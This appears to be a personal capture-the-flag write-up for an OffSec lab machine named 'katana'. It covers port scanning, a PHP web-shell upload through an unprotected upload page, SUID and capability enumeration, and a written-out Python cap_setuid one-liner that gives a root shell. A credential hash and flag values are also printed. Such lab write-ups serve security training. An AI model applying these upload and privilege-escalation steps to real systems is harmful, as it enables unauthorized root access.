# [About]

```
=========================================================================
[OS]:  Linux
[Web-Technology]:  Apache httpd 2.4.38, LiteSpeed, nginx 1.14.2
[Hostname]:  katana
[IP]:   192.168.191.83
[USERS]: katana
[CREDENTIALS]: admin', 'd033e22ae348aeb5660fc2140aec35850c4da997
=========================================================================
```
-----------------------------------------------------------------------------

# [Scanning and Enumeration]

--	[Network Enumeration]

```
PORT     STATE SERVICE       REASON  VERSION
21/tcp   open  ftp           syn-ack vsftpd 3.0.3
22/tcp   open  ssh           syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 89:4f:3a:54:01:f8:dc:b6:6e:e0:78:fc:60:a6:de:35 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDp0J8d7K55SuQO/Uuh8GyKm2xlwCUG3/Jb6+7RlfgbwrCIOzuKXICcMHq4i8z52l/0x0JnN0GUIeNu6Ek/ZGEMK4y+zvAs0R6oPNlScpx0IaLDXTGrjPOcutmx+fy6WDW3/jJGLxwu+55d6pAjzzQR37P1eqH8k9F6fbv6YUFbU+i68x9p5bXCC1m17PDO98Che+q32N6yM26CrQMOl5t1OzO3t1pbvMd3VOQA8Qd+fhz5tpxtRBTSM9ylQj2B+z6XjJnbMPhnO3C1oaYHjjL6KiTfD5YabDqsBf+ZHIdZpM+7fOqKkgHa4bbIWPUXB/OuOJnORvEeRCALOzjcSrxr
|   256 dd:ac:cc:4e:43:81:6b:e3:2d:f3:12:a1:3e:4b:a3:22 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDBsZi0z31ChZ3SWO/gDe+8WyFVPrFX7KgZNp8u/1vlhOSrmdZ32WAZZhTT8bblwgv83FeXPvH7btjDMzTuoYA8=
|   256 cc:e6:25:c0:c6:11:9f:88:f6:c4:26:1e:de:fa:e9:8b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICo+dAzFw2csa366udGUkSre2W0qWWGoyWXwKiHk3YQc
80/tcp   open  http          syn-ack Apache httpd 2.4.38 ((Debian))
|_http-title: Katana X
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
7080/tcp open  ssl/empowerid syn-ack LiteSpeed
| tls-alpn: 
|   h2
|   spdy/3
|   spdy/2
|_  http/1.1
|_http-title: Did not follow redirect to https://192.168.191.83:7080/
| ssl-cert: Subject: commonName=katana/organizationName=webadmin/countryName=US/X509v3 Subject Alternative Name=DNS.1=1.55.254.232
| Issuer: commonName=katana/organizationName=webadmin/countryName=US/X509v3 Subject Alternative Name=DNS.1=1.55.254.232
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-11T13:57:36
| Not valid after:  2022-05-11T13:57:36
| MD5:   0443:4a65:9ba1:0b75:ea8d:d1b8:c855:e495
| SHA-1: f89e:f85e:e6b3:6b10:4ebc:5354:80a0:0ae3:7e10:50cc
| -----BEGIN CERTIFICATE-----
| MIIDfTCCAmWgAwIBAgIUAXyRP1qy58OWLRWfP6CNoErg93wwDQYJKoZIhvcNAQEL
| BQAwTjEPMA0GA1UEAwwGa2F0YW5hMREwDwYDVQQKDAh3ZWJhZG1pbjELMAkGA1UE
| BhMCVVMxGzAZBgNVHREMEkROUy4xPTEuNTUuMjU0LjIzMjAeFw0yMDA1MTExMzU3
| MzZaFw0yMjA1MTExMzU3MzZaME4xDzANBgNVBAMMBmthdGFuYTERMA8GA1UECgwI
| d2ViYWRtaW4xCzAJBgNVBAYTAlVTMRswGQYDVR0RDBJETlMuMT0xLjU1LjI1NC4y
| MzIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDUrg/knoyr6L8pJhlZ
| bEp2vj/1S/2lEiYzl3CbBtCDcNnSQLB2b7hC5vkzIFT5XOHcboXGSWWZ7g1Mlo/U
| irtoeuFYH0KyqYqKH6cJIUCUuIvsKFvEuSpcLB5oHMH1bNYHl8gk2uxnXDRHfxL1
| mhhV+tDewjGu7TzjWcGapvZmJKCQYJto6X4JagN/Xx7bWZQYKb22E/K/17PPg1Wg
| szg2C8a/sj/GWBiw5HADUx5FnQY0FfljwBBSQr10nGiex+w/NAYK8obUTsvUz1P7
| h2aG1V/9FtXHa6HK7YrApieVVTyBZTf4adj5OvmIT5w43vEBZXgCTUMLcf6JmiGy
| OMmdAgMBAAGjUzBRMB0GA1UdDgQWBBRpfqzDB3dS6IMabVgYjX+nQE8xZzAfBgNV
| HSMEGDAWgBRpfqzDB3dS6IMabVgYjX+nQE8xZzAPBgNVHRMBAf8EBTADAQH/MA0G
| CSqGSIb3DQEBCwUAA4IBAQCGCOYvcHj7XrE0fnuDbc4rdQzSVOCOK31F4aV4pWEh
| a6h/WQX9wQBHcs5XPl9D4JVDFQvtxBPWsmnzqqXm8CbeZ7cfAjzPGd994jFBeom6
| 3gnAXmCFSlRsPuqvKkGhBaSDDtzrWE4eZC0H2g9BJp0f6w4sRJSjCH1wZ30Jvgm+
| 9Hkcw9cG0WxkHEBk3SPB7d9iG6rFLJvZE4dcVbA6jtkhQZDrCAqaH69exWtKSQpV
| oBu7+tHFy/8uv7yRuC4fQY7Nmc0JD5otoax1yOpGN/eSz8zRFh+jl5VzdONtXQCO
| H8o8x5fxVi65kRQYil6UcG3lX56V51h/33dxWIDw+lAE
|_-----END CERTIFICATE-----
|_http-server-header: LiteSpeed
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET HEAD POST
8088/tcp open  http          syn-ack LiteSpeed httpd
|_http-server-header: LiteSpeed
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Katana X
8715/tcp open  http          syn-ack nginx 1.14.2
|_http-title: 401 Authorization Required
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
|_http-server-header: nginx/1.14.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
-----------------------------------------------------------------------------

--	[Web Enumeration]

```
--> Files
http://katana.local/ebook
http://katana.local:8088/upload.html

```
![[Pasted image 20240926140518.png]]
upon uploading our `shell.php` script, we notice that we can only access the file from another web-server which is running on port `8715` and as indicated by the above screenshot, it append `katana_` to our file name. POC using an image is below:
![[Pasted image 20240926140926.png]]

-----------------------------------------------------------------------------
# [Lateral Movement]
![[Pasted image 20240926141350.png]]
We need a stable shell so i quickly use the `python's pty` to do that then let now look for the first flag [local.txt].
```bash
cd 
ls -la
cat local.txt

```
![[Pasted image 20240926143146.png]]

```bash
# SUID
www-data@katana:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/umount
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/fusermount

# GUID
www-data@katana:~$ find / -perm -g=s -type f 2>/dev/null
/usr/bin/expiry
/usr/bin/ssh-agent
/usr/bin/bsd-write
/usr/bin/chage
/usr/bin/crontab
/usr/bin/wall
/usr/sbin/unix_chkpwd

```
we tried to see if we can obtain a `suids` and `guids` but nothing usefull came up then i tried using `getcap` for other capabilities.
```bash
www-data@katana:~$ getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python2.7 = cap_setuid+ep

```
![[Pasted image 20240926141932.png]]

Now we observe that `python2.7` have some capabilities that modifies the process id of the current to that of a privilege user [`root`]. I search for python in [gtfobins.github.io](https://gtfobins.github.io/gtfobins/python/#capabilities)
![[Pasted image 20240926142351.png]]

-----------------------------------------------------------------------------

# [Privilege-Escalation]

--> We tried tons of lateral movement but nothing important that came up. The idea of uploading `linpeas.sh` came to me but i just ignore that.

```bash
getcap -r / 2>/dev/null
python -c 'import os; os.setuid(0); os.system("bin/sh")'
```
![[Pasted image 20240926142856.png]]

-----------------------------------------------------------------------------
# [Take away Concept]
```
=========================================================================
* Check for all necessary endpoints in the web-servers
* Use different tools for the job as some might skip some usefull information
* always search for suids and guids and also some capabilities [getcap]

=========================================================================
```

-----------------------------------------------------------------------------
# [Flags]

`local.txt : 675746cc8fc010f3c8216c6ef8e986d2`
`proof.txt : 20e4d036b5406b8fb9e03ff38e8f9565`


#offsec #easy

